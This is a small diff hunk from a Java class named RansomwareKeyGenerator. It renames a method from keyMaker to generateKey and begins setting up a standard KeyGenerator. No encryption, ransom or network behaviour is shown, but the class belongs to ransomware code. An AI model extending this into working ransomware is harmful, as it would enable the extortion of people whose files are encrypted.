@@ -6,7 +6,7 @@ import java.security.SecureRandom;
 import javax.crypto.KeyGenerator;
 
 public class RansomwareKeyGenerator<T> {
-	public T keyMaker(String chosenAlgorithm) {
+	public T generateKey(String chosenAlgorithm) {
 
 		// Creating a KeyGenerator object
 		KeyGenerator keyGen = null;
